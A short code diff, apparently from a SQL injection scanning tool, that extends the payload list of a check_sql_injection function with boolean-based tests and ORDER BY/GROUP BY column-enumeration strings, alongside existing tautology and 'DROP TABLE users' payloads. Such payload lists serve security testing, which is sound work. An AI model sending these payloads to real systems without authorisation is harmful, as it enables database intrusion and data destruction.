@@ -7,7 +7,22 @@ def check_sql_injection(url):
         "' OR '1'='1' --",
         "' OR '1'='1' /*",
         "'; DROP TABLE users; --",
-        "'; SELECT * FROM users; --"
+        "'; SELECT * FROM users; --",
+        "AND 1",
+        "AND 0",
+        "AND true",
+        "AND false",
+        "1-false",
+        "1-true",
+        "1*56",
+        "-2",
+        "1' ORDER BY 1--+",
+        "1' ORDER BY 2--+",
+        "1' ORDER BY 3--+",
+        "1' ORDER BY 1,2--+",
+        "1' ORDER BY 1,2,3--+",
+        "1' GROUP BY 1,2,--+",
+        "1' GROUP BY 1,2,3--+"
     ]
 
     for payload in payloads:
